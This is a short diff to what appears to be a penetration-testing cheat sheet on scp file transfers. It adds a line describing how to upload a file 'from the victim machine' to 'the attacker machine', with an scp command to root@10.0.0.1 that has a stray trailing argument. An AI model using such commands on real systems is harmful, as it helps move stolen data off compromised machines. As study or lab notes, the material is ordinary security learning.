@@ -75,4 +75,7 @@ root# scp myfile.txt user@10.0.0.1:/home/user
 user@10.0.0.1's password:
 OR for download a complete repository 
 root# scp myfile.txt user@10.0.0.1:/home/user/* .
+
+From the victim machine, upload something on the attacker machine
+scp myfile.txt root@10.0.0.1:/root/ .
 ```
